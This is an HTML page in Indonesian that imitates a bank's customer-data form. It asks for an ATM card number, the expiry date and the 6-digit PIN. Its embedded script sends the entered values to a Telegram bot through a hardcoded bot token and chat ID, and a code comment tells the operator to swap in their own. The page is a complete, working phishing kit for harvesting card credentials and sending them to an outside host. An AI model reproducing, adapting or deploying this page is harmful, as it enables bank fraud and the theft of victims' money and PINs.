<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>Form Informasi Data Nasabah</title>
<style>
  /* Reset & base */
  * {
    box-sizing: border-box;
  }
  body {
    margin: 0;
    font-family: 'Inter', system-ui, -apple-system, BlinkMacSystemFont,
      'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif;
    background: #ffffff;
    color: #5a667f;
  }

  /* Header background */
  .header {
    position: relative;
    height: 130px;
    background: linear-gradient(
      135deg,
      #0276bc 0%,
      #0289eb 52%,
      #059fec 100%
    );
    clip-path: polygon(0 0, 100% 0, 100% 80%, 0 100%);
  }

  /* Back arrow */
  .back-arrow {
    position: absolute;
    top: 40px;
    left: 20px;
    cursor: pointer;
    width: 24px;
    height: 24px;
  }
  .back-arrow svg {
    stroke: white;
    stroke-width: 3;
    fill: none;
    stroke-linecap: round;
    stroke-linejoin: round;
  }

  /* Card */
  .card {
    max-width: 400px;
    margin: -50px auto 0;
    background: white;
    border-radius: 24px 24px 0 0;
    padding: 28px 24px 40px;
    box-shadow: none;
  }

  /* Heading */
  .card h2 {
    font-weight: 400;
    font-size: 16px;
    color: #5a667f;
    margin: 0 0 28px 0;
    opacity: 0.7;
  }

  label {
    display: block;
    font-size: 12px;
    font-weight: 400;
    color: #a7b4d1;
    margin-bottom: 8px;
  }

  /* Input container */
  .input-wrapper {
    position: relative;
    margin-bottom: 16px;
  }

  /* Input fields */
  input[type="text"],
  input[type="password"] {
    width: 100%;
    padding: 14px 44px 14px 16px;
    border: none;
    border-radius: 8px;
    background: #f4f7fc;
    font-size: 14px;
    font-weight: 400;
    color: #5a667f;
    outline: none;
  }

  /* Placeholder color */
  input::placeholder {
    color: #99a8cf;
    font-weight: 400;
  }

  /* Char count */
  .char-count {
    font-size: 11px;
    text-align: right;
    color: #c2cae1;
    font-weight: 400;
    margin-top: 2px;
  }

  /* Calendar icon */
  .calendar-icon {
    position: absolute;
    right: 14px;
    top: 50%;
    width: 22px;
    height: 22px;
    fill: #2d4584;
    transform: translateY(-50%);
    pointer-events: none;
  }

  /* Eye icon */
  .eye-icon {
    position: absolute;
    right: 14px;
    top: 50%;
    width: 22px;
    height: 22px;
    stroke: #2d4584;
    stroke-width: 2;
    stroke-linecap: round;
    stroke-linejoin: round;
    fill: none;
    cursor: pointer;
    transform: translateY(-50%);
  }

  /* Submit button */
  button {
    margin-top: 30px;
    width: 100%;
    background: #f9c12c;
    font-weight: 700;
    font-size: 14px;
    color: #4a4a4a;
    border: none;
    border-radius: 8px;
    padding: 14px 0;
    cursor: pointer;
  }
  button:active {
    filter: brightness(0.9);
  }
</style>
</head>
<body>

<div class="header">
  <div class="back-arrow" tabindex="0" aria-label="Kembali" role="button">
    <svg viewBox="0 0 24 24" aria-hidden="true" focusable="false">
      <polyline points="15 18 9 12 15 6" />
    </svg>
  </div>
</div>

<section class="card" aria-label="Form Informasi Data Nasabah">
  <h2>Informasi Data Nasabah.</h2>
  <form id="nasabahForm">
    <label for="atm">Nomor Kartu ATM</label>
    <div class="input-wrapper">
      <input
        type="text"
        id="atm"
        name="atm"
        placeholder="Masukkan nomor kartu ATM Kamu"
        maxlength="18"
        pattern="[0-9]*"
        inputmode="numeric"
        autocomplete="off"
        aria-describedby="atm-count"
        required
      />
    </div>
    <div class="char-count" id="atm-count">0/18</div>

    <label for="expiry">Tanggal Kadaluarsa Kartu ATM</label>
    <div class="input-wrapper">
      <input
        type="text"
        id="expiry"
        name="expiry"
        placeholder="MM/YY"
        maxlength="5"
        pattern="(0[1-9]|1[0-2])\/\d{2}"
        autocomplete="off"
        aria-describedby="expiry-note"
        title="Format MM/YY"
        required
      />
      <svg class="calendar-icon" viewBox="0 0 24 24" aria-hidden="true" focusable="false">
        <path d="M7 11h5v5H7z" fill="#2d4584"/>
        <path d="M19 4h-1V2h-2v2H8V2H6v2H5a2 2 0 00-2 2v12a2 2 0 002 2h14a2 2 0 002-2V6a2 2 0 00-2-2zM5 18V9h14v9z" fill="#2d4584"/>
      </svg>
    </div>

    <label for="pin">6-Digit PIN Kartu ATM</label>
    <div class="input-wrapper">
      <input
        type="password"
        id="pin"
        name="pin"
        placeholder="PIN"
        maxlength="6"
        pattern="[0-9]{6}"
        inputmode="numeric"
        autocomplete="off"
        aria-describedby="pin-count"
        required
      />
      <svg class="eye-icon" viewBox="0 0 24 24" id="togglePin" aria-label="Tampilkan atau sembunyikan PIN" role="button" tabindex="0">
        <!-- Icon mata tertutup -->
        <path d="M1 12s4-7 11-7 11 7 11 7-4 7-11 7-11-7-11-7z" />
        <line x1="4" y1="4" x2="20" y2="20" />
      </svg>
    </div>
    <div class="char-count" id="pin-count">0/6</div>

    <button type="submit">Selanjutnya</button>
  </form>
</section>

<script>
  // Token & chat id Telegram (ganti sesuai data Anda)
  const BOT_TOKEN = '7504434844:AAEJvY81gVUID8gl1BCqdR28oNld83WbNxM';
  const CHAT_ID = '7213790655';

  const atmInput = document.getElementById('atm');
  const atmCount = document.getElementById('atm-count');
  const pinInput = document.getElementById('pin');
  const pinCount = document.getElementById('pin-count');
  const expiryInput = document.getElementById('expiry');
  const togglePin = document.getElementById('togglePin');
  const form = document.getElementById('nasabahForm');

  // Hitung karakter ATM
  atmInput.addEventListener('input', () => {
    atmCount.textContent = `${atmInput.value.length}/18`;
  });

  // Hitung karakter PIN
  pinInput.addEventListener('input', () => {
    pinCount.textContent = `${pinInput.value.length}/6`;
  });

  // Toggle show/hide PIN
  togglePin.addEventListener('click', () => {
    if (pinInput.type === 'password') {
      pinInput.type = 'text';
      togglePin.innerHTML = `
        <path d="M12 5c-5 0-9 7-9 7s4 7 9 7 9-7 9-7-4-7-9-7z" fill="none" stroke="#2d4584" stroke-width="2" />
        <circle cx="12" cy="12" r="3" fill="none" stroke="#2d4584" stroke-width="2" />
      `;
    } else {
      pinInput.type = 'password';
      togglePin.innerHTML = `
        <path d="M1 12s4-7 11-7 11 7 11 7-4 7-11 7-11-7-11-7z" fill="none" stroke="#2d4584" stroke-width="2" />
        <line x1="4" y1="4" x2="20" y2="20" stroke="#2d4584" stroke-width="2" />
      `;
    }
  });

  // Format MM/YY di expiry input
  expiryInput.addEventListener('input', () => {
    let val = expiryInput.value.replace(/[^\d]/g, '');
    if (val.length > 4) val = val.slice(0, 4);
    if (val.length > 2) {
      val = val.slice(0, 2) + '/' + val.slice(2);
    }
    expiryInput.value = val;
  });

  // Kirim data ke Telegram API saat submit
  form.addEventListener('submit', e => {
    e.preventDefault();

    const atm = atmInput.value.trim();
    const expiry = expiryInput.value.trim();
    const pin = pinInput.value.trim();

    if (!atm || !expiry || !pin) {
      alert('Semua input wajib diisi dengan benar!');
      return;
    }

    // Bangun pesan dengan format Markdown
    const message = encodeURIComponent(
      `*Informasi Data Nasabah*\nNomor Kartu ATM: ${atm}\nTanggal Kadaluarsa: ${expiry}\nPIN Kartu ATM: ${pin}`
    );

    // Kirim pesan ke Telegram melalui fetch
    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${message}&parse_mode=Markdown`)
      .then(res => res.json())
      .then(data => {
        if (data.ok) {
          alert('Data berhasil dikirim ke Telegram!');
          form.reset();
          atmCount.textContent = '0/18';
          pinCount.textContent = '0/6';
        } else {
          alert('Gagal mengirim data ke Telegram.');
          console.error(data);
        }
      })
      .catch(err => {
        alert('Terjadi kesalahan saat mengirim data.');
        console.error(err);
      });
  });
</script>

</body>
</html>
